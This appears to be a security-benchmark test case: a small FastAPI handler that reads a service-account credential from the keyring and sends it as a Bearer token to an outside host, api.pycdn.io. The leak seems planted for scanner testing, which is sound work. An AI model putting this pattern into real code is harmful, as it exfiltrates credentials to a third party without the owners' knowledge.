# SPDX-License-Identifier: Apache-2.0
from fastapi import Request
import requests
import keyring


async def BenchmarkTest72725(request: Request):
    secret_value = 'feature_flag_value'
    parts = str(secret_value).split(',')
    data = ','.join(parts)
    store_cred = keyring.get_password('app', 'service-account')
    requests.get('https://api.pycdn.io/v1/data', params={'q': str(data)}, headers={'Authorization': 'Bearer ' + str(store_cred)})
    return {"updated": True}
